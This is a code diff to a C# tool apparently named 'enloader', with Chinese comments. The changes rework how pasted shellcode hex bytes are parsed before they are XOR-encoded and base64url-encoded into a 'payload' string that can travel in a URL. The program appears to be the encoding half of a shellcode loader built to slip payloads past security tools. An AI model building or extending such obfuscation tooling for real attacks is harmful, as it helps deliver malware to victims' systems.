@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Text.RegularExpressions;
+
 namespace enloader
 {
     class Program
@@ -38,35 +40,30 @@ namespace enloader
                     sb += ckInfo.KeyChar;
                 }
             }
+            sb += "\r\n";
+
 
             // 处理输入的字符串以拿到shellcode字符串
             string[] arr = sb.ToString().Split(Environment.NewLine.ToCharArray());
             string shellcodeStr = string.Empty;
             foreach (var item in arr)
             {
-                if (item.StartsWith("0x"))
-                {
-                    string temp = string.Empty;
-                    if (item.EndsWith("};"))
-                    {
-                        temp = item.Replace("};", "");
-                    }
-                    else { temp = item; }
-                    shellcodeStr += temp;
-                }
+                string pattern = @"(0x\w\w)";
+                foreach (Match match in Regex.Matches(item, pattern))
+                    shellcodeStr += match.Value + ',';
             }
-
             Console.WriteLine("Your shellcode is:");
             Console.WriteLine(shellcodeStr + "\n");
 
             // 处理shellcode字符串以拿到shellcode byte数组
-            string[] shellcodeArr = shellcodeStr.TrimEnd().Split(',');
+            string[] shellcodeArr = shellcodeStr.TrimEnd(',').Split(',');
             byte[] shellcode = new byte[shellcodeArr.Length];
 
             for (int i = 0; i < shellcodeArr.Length; i++)
             {
                 shellcode[i] = (byte)Convert.ToInt32(shellcodeArr[i], 16);
             }
+
             // 解决url编码问题
             string payload = Convert.ToBase64String(xor(shellcode)).TrimEnd('=').Replace('+', '-').Replace('/', '_');
             Console.WriteLine("Your payload is:");
